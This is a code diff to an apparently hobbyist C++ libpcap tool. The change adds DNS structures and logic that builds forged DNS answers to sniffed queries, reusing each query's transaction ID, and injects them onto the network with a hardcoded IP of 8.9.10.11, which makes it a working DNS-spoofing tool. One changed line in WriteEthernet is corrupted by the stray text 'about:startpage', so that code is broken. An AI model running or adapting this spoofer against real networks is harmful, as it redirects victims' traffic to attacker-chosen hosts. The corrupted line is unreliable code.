@@ -13,6 +13,7 @@
 #include <net/ethernet.h>
 #include <netinet/ip.h>
 #include <netinet/udp.h>
+#include <arpa/inet.h>
 
 using namespace std;
 
@@ -32,6 +33,83 @@ typedef struct
 {
     pcap_t* handle;
 } DNSRequestArgs;
+
+//DNS header
+typedef struct
+{
+    u_int16_t   transId;
+    u_int16_t   flags;
+    u_int16_t   questionCnt;
+    u_int16_t   answerCnt;
+    u_int16_t   authorityCnt;
+    u_int16_t   additionalCnt;
+} DNSHeader;
+
+typedef struct
+{
+    u_int16_t   type;
+    u_int16_t   cls;
+} DNSQuestion;
+
+typedef struct
+{
+    u_int16_t       url;
+    u_int16_t       type;
+    u_int16_t       cls;
+    u_int16_t       ttl0;
+    u_int16_t       ttl1; //wasted 30 mins to realize this stupid memory alignment
+    u_int16_t       length;
+    in_addr         data;
+} DNSRR;
+
+void GetDNSResponseParams(const u_char* pRequestPacket, u_int16_t& nRespLen, string& szQuestion)
+{
+    unsigned int pos = sizeof(ether_header) + sizeof(ip) + sizeof(udphdr) + sizeof(DNSHeader);
+    
+    szQuestion = string(reinterpret_cast<const char*>(pRequestPacket + pos));
+    unsigned int questionLen = szQuestion.size();
+    
+    nRespLen = static_cast<u_int16_t>(2*(questionLen+1) + sizeof(DNSQuestion) + sizeof(DNSRR));
+}
+
+void WriteDNS(u_char* pPacket,
+              unsigned int& nPos,
+              const string& szQuestionUrl,
+              u_int16_t transId,
+              const char* szResponseIp)
+{
+    DNSHeader* pDNSHeader = reinterpret_cast<DNSHeader*>(pPacket+nPos);
+    pDNSHeader->transId         = htons(transId);
+    pDNSHeader->flags           = htons(0x8180);
+    pDNSHeader->questionCnt     = htons(0x0001);
+    pDNSHeader->answerCnt       = htons(0x0001);
+    pDNSHeader->authorityCnt    = htons(0x0000);
+    pDNSHeader->additionalCnt   = htons(0x0000);
+    nPos += sizeof(DNSHeader);
+    
+    memcpy(pPacket+nPos, szQuestionUrl.c_str(), szQuestionUrl.size());
+    nPos += szQuestionUrl.size();
+    pPacket[nPos++] = 0;
+    
+    DNSQuestion* pDNSQuestion = reinterpret_cast<DNSQuestion*>(pPacket+nPos);
+    pDNSQuestion->type  = htons(0x0001);
+    pDNSQuestion->cls   = htons(0x0001);
+    nPos += sizeof(DNSQuestion);
+    
+    DNSRR* pDNSAnswer = reinterpret_cast<DNSRR*>(pPacket+nPos);
+    pDNSAnswer->url     = htons(0xc00c); //TODO: what is this? (copied from Wireshark)
+    pDNSAnswer->type    = htons(0x0001);
+    pDNSAnswer->cls     = htons(0x0001);
+    pDNSAnswer->ttl0    = htons(0x0000);
+    pDNSAnswer->ttl1    = htons(0x0080);
+    pDNSAnswer->length  = htons(0x0004);
+    
+    in_addr responseAddr;
+    inet_aton(szResponseIp, &responseAddr);
+    pDNSAnswer->data    = responseAddr;
+    
+    nPos += sizeof(DNSRR);
+}
 
 void WriteUDP(u_char* pPacket,
               unsigned int& nPos,
@@ -113,7 +191,7 @@ void WriteEthernet(u_char* pPacket,
     ether_header* pEth = reinterpret_cast<ether_header*>(pPacket+nPos);
     
     memcpy(pEth->ether_dhost, pDst, ETH_ALEN * sizeof(u_char));
-    memcpy(pEth->ether_shost, pSrc, ETH_ALEN * sizeof(u_char));
+    memcpy(pEth->ether_shost, pSrc, about:startpageETH_ALEN * sizeof(u_char));
     pEth->ether_type = htons(0x0800);
     
     nPos += sizeof(ether_header);
@@ -123,7 +201,11 @@ int CreateDNSResponse(const u_char* pInPacket, u_char** pOutPacket, uint16_t& uO
 {
     try
     {
-        u_int16_t uPacketSize = sizeof(ether_header) + sizeof(ip) + sizeof(udphdr);
+        u_int16_t uDNSResponseLength = 0;
+        string szQuestion;
+        GetDNSResponseParams(pInPacket, uDNSResponseLength, szQuestion);
+        
+        u_int16_t uPacketSize = sizeof(ether_header) + sizeof(ip) + sizeof(udphdr) + uDNSResponseLength;
         u_char* pPacket = new u_char[uPacketSize+1];
         MY_ASSERT(pPacket);
         memset(pPacket, 0, (uPacketSize+1) * sizeof(u_char));
@@ -150,6 +232,13 @@ int CreateDNSResponse(const u_char* pInPacket, u_char** pOutPacket, uint16_t& uO
                  uPacketSize,
                  ntohs(pInUDP->dest),       //source=query dest port
                  ntohs(pInUDP->source));    //dest  =query source port
+        nInPos += sizeof(udphdr);
+                 
+        const DNSHeader* pInDNSHeader = reinterpret_cast<const DNSHeader*>(pInPacket+nInPos);
+        WriteDNS(pPacket, nOutPos,
+                 szQuestion,
+                 ntohs(pInDNSHeader->transId),
+                 "8.9.10.11");
                  
         *pOutPacket = pPacket;
         uOutPacketSize = uPacketSize;
@@ -160,6 +249,7 @@ int CreateDNSResponse(const u_char* pInPacket, u_char** pOutPacket, uint16_t& uO
         return -2;
     }
     
+    sleep(10);
     return 0;
 }
 
@@ -169,7 +259,7 @@ int RespondToDNSRequest(pcap_t* handle, const u_char* pRequestPacket)
     u_int16_t uPacketSize = 0;
     CreateDNSResponse(pRequestPacket, &pResponsePacket, uPacketSize);
     
-    pcap_inject(handle, (void*) pResponsePacket, uPacketSize);
+    pcap_inject(handle, reinterpret_cast<void*>(pResponsePacket), uPacketSize);
 }
 
 inline void CreateDNSRequestFilter(const string& srcIP, string& filter)
